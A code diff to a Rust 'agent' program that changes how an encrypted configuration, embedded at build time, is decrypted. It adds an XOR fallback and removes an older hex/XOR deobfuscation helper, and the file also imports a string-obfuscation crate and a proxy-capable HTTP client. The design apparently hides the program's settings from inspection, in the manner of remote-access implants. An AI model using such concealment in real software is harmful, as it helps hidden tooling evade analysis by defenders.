@@ -7,8 +7,9 @@ use log::{info, warn, error};
 use reqwest::{Client, Proxy};
 use obfstr::obfstr;
 
-/// Optimized key derivation using ChaCha20 core for cryptographic mixing
-/// This must match the implementation in build.rs exactly
+/// Key derivation using ChaCha20 quarter-round mixing over DefaultHasher seed.
+/// IMPORTANT: This implementation MUST match build.rs derive_key_from_seed() exactly.
+/// Build scripts cannot import from the main crate, so this is intentionally duplicated.
 #[cfg(any(feature = "encryption-aes", feature = "encryption-chacha"))]
 fn derive_key_from_seed(seed: &str) -> [u8; 32] {
     use std::collections::hash_map::DefaultHasher;
@@ -120,7 +121,7 @@ fn decrypt_config(encrypted_data: &[u8], key_str: &str) -> Result<String, String
 }
 
 // --- ChaCha20 Decryption Logic ---
-#[cfg(feature = "encryption-chacha")]
+#[cfg(all(feature = "encryption-chacha", not(feature = "encryption-aes")))]
 fn decrypt_config(encrypted_data: &[u8], key_str: &str) -> Result<String, String> {
     use chacha20poly1305::aead::{Aead, KeyInit};
     use chacha20poly1305::{ChaCha20Poly1305, Key, Nonce};
@@ -141,24 +142,20 @@ fn decrypt_config(encrypted_data: &[u8], key_str: &str) -> Result<String, String
     String::from_utf8(decrypted_bytes).map_err(|e| e.to_string())
 }
 
+// --- Fallback: XOR deobfuscation when no encryption feature is enabled ---
+#[cfg(not(any(feature = "encryption-aes", feature = "encryption-chacha")))]
+fn decrypt_config(encrypted_data: &[u8], key_str: &str) -> Result<String, String> {
+    let key = derive_key_from_seed(key_str);
+    let decrypted: Vec<u8> = encrypted_data
+        .iter()
+        .enumerate()
+        .map(|(i, b)| b ^ key[i % key.len()])
+        .collect();
+    String::from_utf8(decrypted).map_err(|e| format!("XOR decrypt failed: {}", e))
+}
+
 // Include the generated config file
 include!(concat!(env!("OUT_DIR"), "/config.rs"));
-
-// Helper function to deobfuscate the config
-fn deobfuscate_config(hex_content: &str, key_str: &str) -> Result<String, String> {
-    let key_bytes = key_str.as_bytes();
-    let mut obfuscated_bytes = Vec::new();
-    for i in (0..hex_content.len()).step_by(2) {
-        let byte_str = hex_content.get(i..i+2).ok_or_else(|| "Invalid hex string length".to_string())?;
-        let byte = u8::from_str_radix(byte_str, 16).map_err(|e| format!("Invalid hex character: {}", e))?;
-        obfuscated_bytes.push(byte);
-    }
-
-    for (i, byte) in obfuscated_bytes.iter_mut().enumerate() {
-        *byte ^= key_bytes[i % key_bytes.len()];
-    }
-    String::from_utf8(obfuscated_bytes).map_err(|e| format!("Deobfuscated config is not valid UTF-8: {}", e))
-}
 
 #[derive(Serialize, Deserialize, Clone, Debug)]
 pub struct AgentConfig {
